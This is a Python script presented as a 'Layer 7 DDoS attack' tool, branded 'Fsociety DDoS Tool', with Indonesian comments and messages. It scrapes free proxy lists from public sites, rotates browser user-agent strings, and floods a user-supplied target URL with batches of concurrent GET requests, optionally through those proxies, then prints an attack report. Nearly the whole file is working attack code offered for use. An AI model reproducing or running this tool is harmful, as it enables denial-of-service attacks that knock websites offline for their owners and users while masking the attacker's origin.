import sys
import requests
import asyncio
import aiohttp
import random
from bs4 import BeautifulSoup
from datetime import datetime
import time
import os

# ASCII Art
ASCII_ART = """
 ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£†‚£¶‚£§‚£¥‚£§‚£§‚£Ñ‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£§‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚°Ä‚†Ä‚†Ä‚£Ä‚£Ä‚£†‚£æ‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£õ‚£õ‚£ª‚£ø‚£¶‚£Ä‚†Ä‚¢Ä‚£Ä‚£Ä‚£è‚£π‚†Ä
‚¢†‚£∂‚£∂‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†ø‚†≠‚†≠‚†Ω‚†Ω‚†ø‚†ø‚†≠‚†≠‚†≠‚†Ω‚†ø‚†ø‚†õ
‚†à‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ø‚†õ‚†â‚¢ª‚£ø‚£ø‚£ø‚°ü‚†è‚†â‚†â‚£ø‚¢ø‚£ø‚£ø‚£ø‚£á‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚£ø‚°ø‚†ø‚†õ‚†â‚†Å‚†Ä‚†Ä‚†Ä‚¢†‚£ø‚£ø‚£ø‚†ã‚†ë‚†í‚†í‚†ö‚†ô‚†∏‚£ø‚£ø‚£ø‚£ø‚°Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚£ø‚£ø‚°ø‚†ø‚†õ‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£∞‚£ø‚£ø‚°ø‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢ª‚£ø‚£ø‚£ø‚£ø‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚†õ‚†õ‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ª‚£ø‚£ø‚£ø‚£ø‚£¶‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚£ø‚£ø‚£ø‚£ø‚£ø‚£∑‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†ª‚¢ø‚£ø‚°ø‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä                                                   
           DDOS ATTACK LAYER 7 | V 9.9.9
        
       DEVELOPER : SABIT | HydraKraken | ùóßùóòùóîùó† ùóîùó°ùó¢ùó°ùó¨ùó†ùó¢ùó®ùó¶ ùóúùó°ùóóùóúùóî
       GITHUB : https://github.com/TEAM-ANONYMOUS-INDIA                                                 
                                                                                                       
                                                                              
                                                                                                                                                                          
"""

# Konfigurasi dasar
DEFAULT_REQUESTS = 1000
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# Daftar sumber proxy
PROXY_SOURCES = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
]

# Fungsi untuk mendapatkan daftar proxy dari sumber online
async def fetch_proxies(source):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as response:
                if response.status == 200:
                    html = await response.text()
                    # Sesuaikan parsing HTML berdasarkan sumber
                    if "us-proxy.org" in source or "socks-proxy.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'proxylisttable'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyscrape.com" in source:
                        proxies = html.strip().split('\r\n')
                        return ["http://" + proxy for proxy in proxies]
                    elif "proxynova.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'tbl_proxy_list'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxybros.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxydb.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-sm'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "spys.one" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'spy1xx'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "freeproxy.world" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped table-bordered'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "hasdata.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'proxies'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyrack.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "api.proxyscrape.com" in source:
                         proxies = html.strip().split('\r\n')
                         return proxies
                    else:
                        print(f"Tidak dapat memproses sumber proxy: {source}")
                        return []
                else:
                    print(f"Failed to fetch proxies from {source}. Status code: {response.status}")
                    return []
    except Exception as e:
        print(f"Error fetching proxies from {source}: {e}")
        return []

# Fungsi untuk mengumpulkan proxy dari semua sumber
async def get_all_proxies():
    all_proxies = []
    for source in PROXY_SOURCES:
        proxies = await fetch_proxies(source)
        if proxies:
            all_proxies.extend(proxies)
            print(f"Berhasil mengambil {len(proxies)} proxy dari {source}")
        else:
            print(f"Gagal mengambil proxy dari {source}")
    return all_proxies

# Fungsi untuk membersihkan layar
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Fungsi untuk menampilkan progres loading (diperbarui untuk kecepatan)
def show_progress(progress, total=100, length=50):
    percent = (progress / float(total)) * 100
    bar = '#' * int(length * progress / float(total))
    spaces = ' ' * (length - len(bar))
    print(f'\r[{bar}{spaces}] {percent:.2f}%', end='', flush=True)  # Menggunakan print langsung

# Fungsi untuk melakukan serangan DDoS (dipercepat)
async def attack(url, session, stealth_mode, proxy=None):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if proxy:
            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as response:  # Mengurangi timeout
                return "Berhasil"
        else:
            async with session.get(url, headers=headers, timeout=5) as response:  # Mengurangi timeout
                return "Berhasil"
    except:
        return "Gagal"

# Fungsi utama untuk menjalankan serangan secara bersamaan (dipercepat)
async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
    clear_screen()
    print(ASCII_ART)  # Cetak ASCII art sebelum pesan serangan

    print(f"Menyerang {url} dengan {num_requests} permintaan...\n")

    success_count = 0
    failure_count = 0
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(num_requests):
            proxy = random.choice(proxies) if proxies else None
            task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
            tasks.append(task)

            if len(tasks) >= 500:  # Batasi jumlah tugas untuk mencegah kelebihan beban
                results = await asyncio.gather(*tasks)
                success_count += results.count("Berhasil")
                failure_count += results.count("Gagal")
                tasks = []  # Reset daftar tugas
                show_progress((i + 1) / num_requests * 100)  # Tampilkan progres

        # Proses tugas yang tersisa
        if tasks:
            results = await asyncio.gather(*tasks)
            success_count += results.count("Berhasil")
            failure_count += results.count("Gagal")
            show_progress(100)  # Pastikan progres mencapai 100%

    end_time = time.time()
    elapsed_time = end_time - start_time

    print("\n\n===== üí£Laporan Seranganüí£ =====")
    print(f"URL Target: {url}")
    print(f"Jumlah Permintaan: {num_requests}")
    print(f"Serangan Berhasil: {success_count}")
    print(f"Serangan Gagal: {failure_count}")
    print(f"Waktu yang dihabiskan: {elapsed_time:.2f} detik")
    print("==========================")

# Fungsi untuk menampilkan menu dan mendapatkan input dari pengguna
def show_menu():
    print("\n===== üé≠Fsociety DDoS Toolüé≠ =====")
    print("1. Target URL")
    print("2. Threads (Default: {})".format(DEFAULT_REQUESTS))
    print("3. Stealth Mode (At the moment: {})".format("Active" if stealth_mode else "NonActive"))
    print("4. Proxy (At the moment: {})".format("Active" if use_proxy else "NonActive"))
    print("5. Attack")
    print("6. Exit")
    print("===============================")
    print("CHOICE : ")
    choice = input("Select an option: ")
    return choice

# Variabel global untuk menyimpan opsi
url = None
num_requests = DEFAULT_REQUESTS
stealth_mode = False
use_proxy = False
proxies = []  # Daftar proxy yang akan digunakan
ascii_printed = False  # Tambahkan variabel untuk melacak apakah ASCII sudah dicetak

# Fungsi utama yang memproses menu dan memulai serangan
def main():
    global url, num_requests, stealth_mode, use_proxy, proxies, ascii_printed

    if not ascii_printed:  # Cetak ASCII hanya sekali
        print(ASCII_ART)
        ascii_printed = True

    while True:
        choice = show_menu()

        if choice == '1':
            url = input("Enter Target URL: ")
        elif choice == '2':
            try:
                num_requests = int(input("Enter Request Amount: "))
            except ValueError:
                print("Input tidak valid. Menggunakan jumlah permintaan default.")
                num_requests = DEFAULT_REQUESTS
        elif choice == '3':
            stealth_mode = not stealth_mode
            print("Stealth Mode sekarang: {}".format("Active" if stealth_mode else "NonActive"))
        elif choice == '4':
            use_proxy = not use_proxy
            print("Penggunaan Proxy sekarang: {}".format("Active" if use_proxy else "NonActive"))
            if use_proxy:
                print("Mengambil daftar proxy...")
                proxies = asyncio.run(get_all_proxies())
                if proxies:
                    print(f"Berhasil mengambil {len(proxies)} proxy.")
                else:
                    print("Gagal mengambil proxy. Serangan akan dilanjutkan tanpa proxy.")
                    use_proxy = False
            else:
                proxies = []
        elif choice == '5':
            if not url:
                print("Target URL has not been entered. Please enter the URL first.")
            else:
                clear_screen()  # Bersihkan layar sebelum mencetak ASCII
                print(ASCII_ART) # Cetak ASCII art di interface kedua
                print("Memulai serangan...")
                asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
                print("Serangan selesai.")
        elif choice == '6':
            print("\n--GOOD BYE FRIEND--")
            break
        else:
            print("Invalid option. Please try again.")

if __name__ == "__main__":
    main()
